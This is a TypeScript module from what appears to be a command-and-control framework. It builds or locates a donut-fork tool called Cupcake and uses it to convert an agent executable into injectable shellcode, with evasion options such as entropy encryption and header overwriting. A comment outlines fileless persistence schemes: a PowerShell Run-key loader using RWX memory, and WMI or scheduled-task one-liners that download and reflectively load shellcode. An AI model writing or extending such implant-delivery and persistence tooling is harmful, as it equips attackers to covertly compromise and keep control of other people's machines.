import fs from "fs";
import path from "path";
import { $ } from "bun";
import { ensureDataDir } from "../paths";
import { logger } from "../logger";
import { resolveRuntimeRoot } from "./runtime-paths";

const VERSION_TTL_MS = 24 * 60 * 60 * 1000; // re-check source mtime at most once per day

type CachedVersion = { tag: string; cachedAt: number };

/**
 * Cupcake (a maintained fork of TheWover/donut with fixes and improvements) is
 * vendored in the repository under `cupcake/`. Unlike upstream donut, Cupcake
 * ships no prebuilt releases, so the binary is obtained from source:
 *
 *   1. a system-installed binary (e.g. pre-compiled in the Docker image),
 *   2. a previously compiled binary in the data/tools directory,
 *   3. compiling the vendored source with gcc (Linux) / mingw-gcc (Windows).
 */

function toolsDir(): string {
  return path.join(ensureDataDir(), "tools");
}

function binaryPath(): string {
  return path.join(toolsDir(), process.platform === "win32" ? "cupcake.exe" : "cupcake");
}

function versionFilePath(): string {
  return path.join(toolsDir(), "cupcake.version");
}

function readCache(): CachedVersion | null {
  try { return JSON.parse(fs.readFileSync(versionFilePath(), "utf8")); } catch { return null; }
}

function writeCache(tag: string): void {
  try {
    fs.mkdirSync(toolsDir(), { recursive: true });
    fs.writeFileSync(versionFilePath(), JSON.stringify({ tag, cachedAt: Date.now() }));
  } catch {}
}

function findSystemCupcake(): string | null {
  const systemCandidates = ["/usr/local/bin/cupcake", "/usr/bin/cupcake"];
  for (const c of systemCandidates) {
    if (fs.existsSync(c)) return c;
  }
  try {
    const exe = process.platform === "win32" ? "cupcake.exe" : "cupcake";
    const p = Bun.which(exe);
    if (p) return p;
  } catch {}
  return null;
}

function resolveCacheAge(): number {
  const cached = readCache();
  if (!cached) return Infinity;
  return Date.now() - cached.cachedAt;
}

export function resolveCupcakeSourceDir(): string | null {
  const explicit = process.env.CUPCAKE_SOURCE_DIR?.trim();
  const candidates = [
    explicit ? path.resolve(explicit) : null,
    path.resolve(resolveRuntimeRoot(), "cupcake"),
    path.resolve(process.cwd(), "cupcake"),
    path.resolve(import.meta.dir, "../../../cupcake"),
  ];
  for (const candidate of candidates) {
    if (candidate && fs.existsSync(path.join(candidate, "donut.c"))) return candidate;
  }
  return null;
}

function findCompiler(): string | null {
  if (process.platform === "win32") {
    for (const c of ["x86_64-w64-mingw32-gcc", "gcc"]) {
      if (Bun.which(c)) return c;
    }
    return null;
  }
  return Bun.which("gcc") ? "gcc" : null;
}

/**
 * Compiles the vendored Cupcake source (upstream donut build recipe, renamed
 * output). Uses aPLib packing which works on every host platform.
 */
async function buildFromSource(sendToStream?: (data: any) => void): Promise<string | null> {
  const log = (text: string, level = "info") =>
    sendToStream?.({ type: "output", text: `${text}\n`, level });

  const sourceDir = resolveCupcakeSourceDir();
  if (!sourceDir) {
    log("Cupcake: vendored source not found (cupcake/)", "warn");
    return null;
  }
  const cc = findCompiler();
  if (!cc) {
    log(
      process.platform === "win32"
        ? "Cupcake: no gcc/x86_64-w64-mingw32-gcc on PATH — cannot compile from source"
        : "Cupcake: no gcc on PATH — cannot compile from source",
      "warn",
    );
    return null;
  }

  const out = binaryPath();
  fs.mkdirSync(path.dirname(out), { recursive: true });
  const aplib = process.platform === "win32" ? "lib/aplib64.lib" : "lib/aplib64.a";

  log("Cupcake: compiling vendored source…");
  try {
    const r = await $`${cc} -Wunused-function -Wall -fpack-struct=8 -DDONUT_EXE -I include donut.c hash.c encrypt.c format.c loader/clib.c ${aplib} -o ${out}`
      .cwd(sourceDir).nothrow().quiet();
    if (r.exitCode !== 0 || !fs.existsSync(out)) {
      const stderr = r.stderr.toString().trim();
      log(`Cupcake: compile failed (exit ${r.exitCode})${stderr ? `: ${stderr}` : ""}`, "warn");
      log("Cupcake Shellcode mode requires a compiled cupcake binary — install gcc/x86_64-w64-mingw32-gcc", "warn");
      return null;
    }
    fs.chmodSync(out, 0o755);
    return out;
  } catch (err: any) {
    log(`Cupcake: compile error: ${err?.message ?? err}`, "warn");
    return null;
  }
}

/**
 * Ensures the Cupcake binary is available, in this order:
 *   1. system-installed binary (PATH or /usr/local/bin),
 *   2. previously compiled binary in data/tools,
 *   3. freshly compiled from the vendored cupcake/ source.
 * Returns the path to the binary, or null if it could not be obtained.
 */
export async function ensureCupcake(
  sendToStream?: (data: any) => void,
): Promise<string | null> {
  const bin = binaryPath();
  const cached = readCache();
  const binExists = fs.existsSync(bin);
  const fresh = resolveCacheAge() <= VERSION_TTL_MS;

  const log = (text: string, level = "info") => {
    logger.info(`[cupcake] ${text.trim()}`);
    sendToStream?.({ type: "output", text: `${text}\n`, level });
  };

  // Prefer a system-installed binary (e.g. compiled into the Docker image)
  // before anything else. Record it so future calls skip further work.
  const sysBin = findSystemCupcake();
  if (sysBin && (fresh || !binExists)) {
    log(`Cupcake: using system binary at ${sysBin}`);
    writeCache("system");
    return sysBin;
  }

  if (binExists && fresh) {
    log(`Cupcake: using compiled binary (${cached!.tag})`);
    return bin;
  }

  if (binExists && !fresh && !sysBin) {
    // Nothing new on system — keep using our own compiled binary.
    log(`Cupcake: using compiled binary (${cached?.tag ?? "unknown"})`);
    writeCache(cached?.tag ?? "built");
    return bin;
  }

  const built = await buildFromSource(sendToStream);
  if (built) {
    const sourceDir = resolveCupcakeSourceDir();
    const sourceStat = sourceDir ? fs.statSync(sourceDir) : null;
    writeCache(`built from cupcake${sourceStat ? ` @${sourceStat.mtimeMs}` : "@"}`);
    log("Cupcake: ready (compiled from source)");
    return built;
  }

  if (binExists) {
    log("Cupcake: compile failed — falling back to existing binary", "warn");
    return bin;
  }

  log("Cupcake Shellcode mode requires a cupcake binary (system PATH, data/tools, or vendored cupcake/ source + gcc)", "error");
  return null;
}

/**
 * Converts a Windows PE executable to position-independent shellcode using
 * Cupcake (the maintained donut fork). CLI is donut-compatible.
 *
 * Flags used:
 *   -f 1   raw shellcode output (no base64/C/etc wrapping)
 *   -a 1|2 architecture (1=x86, 2=x64)
 *   -z N   compression. LZNT1/Xpress (-z 3/4) use Windows RtlCompressBuffer
 *          APIs and only work when Cupcake runs on a Windows host. We pick the
 *          best available for the host: -z 3 (LZNT1) on Windows, -z 2 (aPLib,
 *          cross-platform) elsewhere.
 *   -b 1   no AMSI/WLDP/ETW bypass — caller is responsible for evasion (e.g. SGN)
 *   -t     single-threaded shellcode (optional, off by default)
 *   -x N   exit mode (optional, default cupcake internal: 1=exit thread)
 *          1 = exit thread, 2 = exit process, 3 = don't exit
 *   -e N   entropy level (optional, default cupcake internal: 3=encrypt+randomize)
 *          1 = none, 2 = random names only, 3 = random names + symmetric encryption
 *   -k N   preserve PE headers (optional, default cupcake internal: 1=overwrite)
 *          1 = overwrite (zero or decoy), 2 = keep all headers intact
 *   -y N   resume host execution at offset (optional)
 *          creates a new thread for the loader, then continues host execution
 *          at the given file offset relative to the host's executable base
 *
 * Exit behavior defaults to "exit thread" (-x 1) when -x is omitted, which is
 * what we want — prevents crashing the host process when the agent terminates.
 *
 * NOTE — persistence in shellcode mode:
 *   When the agent runs as shellcode injected into another process, os.Executable()
 *   on Windows resolves to the HOST process binary via GetModuleFileNameW(NULL).
 *   Persistence methods (startup, registry, taskscheduler, wmi) would therefore
 *   register the HOST executable for autostart — not the agent — which is wrong.
 *
 *   Theoretical fixes:
 *   1. Server-side stage-2 push: after first connection the server sends agent_update
 *      with a PE binary (persistence-enabled). Agent writes it to disk + registers.
 *   2. Registry shellcode blob: store raw shellcode in a Run key with a PowerShell
 *      loader stub that allocates RWX memory, copies the blob, and CreateThread's it.
 *      Requires a new persist_shellcode_registry build tag in the agent.
 *   3. WMI/task scheduler with a PS one-liner that downloads and reflectively loads
 *      the shellcode each time the trigger fires (fully fileless persistence).
 *   4. Self-droping: on first run, agent uses VirtualQuery on a known code pointer to
 *      locate its own loaded image, writes it to a temp path, and registers from there.
 */
export async function runCupcake(
  inputPe: string,
  outputBin: string,
  arch: "amd64" | "386",
  sendToStream: (data: any) => void,
  opts?: { singleThreaded?: boolean; exitMode?: number; entropy?: number; preserveHeaders?: boolean; resumeOffset?: number },
): Promise<boolean> {
  const bin = await ensureCupcake(sendToStream);
  if (!bin) {
    sendToStream({ type: "output", text: "ERROR: Cupcake binary not available\n", level: "error" });
    return false;
  }

  const archFlag = arch === "386" ? "1" : "2";
  const compressFlag = process.platform === "win32" ? "3" : "2";
  const extraFlags: string[] = [];
  if (opts?.singleThreaded) extraFlags.push("-t");
  if (opts?.exitMode !== undefined) extraFlags.push("-x", String(opts.exitMode));
  if (opts?.entropy !== undefined) extraFlags.push("-e", String(opts.entropy));
  if (opts?.preserveHeaders) extraFlags.push("-k", "2");
  if (opts?.resumeOffset !== undefined) extraFlags.push("-y", String(opts.resumeOffset));

  try {
    // -i flag required since cupcake v1 (previously positional arg)
    const result = await $`${bin} -a ${archFlag} -z ${compressFlag} -f 1 -b 1 ${extraFlags} -o ${outputBin} -i ${inputPe}`
      .nothrow()
      .quiet();
    const stdout = result.stdout.toString().trim();
    if (stdout) {
      sendToStream({ type: "output", text: stdout + "\n", level: "info" });
    }
    if (result.exitCode !== 0) {
      const stderr = result.stderr.toString().trim();
      sendToStream({ type: "output", text: `Cupcake failed (exit ${result.exitCode})${stderr ? `: ${stderr}` : ""}\n`, level: "error" });
      return false;
    }
    const outSize = fs.existsSync(outputBin) ? fs.statSync(outputBin).size : 0;
    if (outSize === 0) {
      sendToStream({ type: "output", text: "Cupcake produced no output — check that the input PE is valid\n", level: "error" });
      return false;
    }
    return true;
  } catch (err: any) {
    sendToStream({ type: "output", text: `Cupcake error: ${err?.message ?? err}\n`, level: "error" });
    return false;
  }
}
